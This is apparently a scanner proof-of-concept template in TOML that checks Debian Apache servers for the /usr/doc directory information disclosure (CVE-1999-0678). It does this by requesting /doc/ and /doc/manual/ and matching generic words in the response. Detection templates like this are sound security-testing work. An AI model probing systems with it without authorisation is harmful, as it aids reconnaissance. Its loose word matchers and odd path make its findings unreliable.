[info]
author = "ave"
description = "验证目标 Debian Apache 服务器是否存在 /usr/doc 目录遍历导致的信息泄露漏洞。通过 HTTP GET 请求访问 /doc/ 路径，若返回包含文档文件列表或内容，则判定存在漏洞。"
id = "POC-AVE-1999-1016"
name = "Debian Apache HTTP Server /usr/doc 目录信息泄露 PoC"
severity = "medium"
tags = ["ave-1999-1016"]
vuln_id = [
    "CVE-1999-0678",
    "AVE-1999-1016",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/doc/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Apache",
    "manual",
    "documentation",
    "doc",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/doc/manual/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Apache",
    "manual",
    "documentation",
]
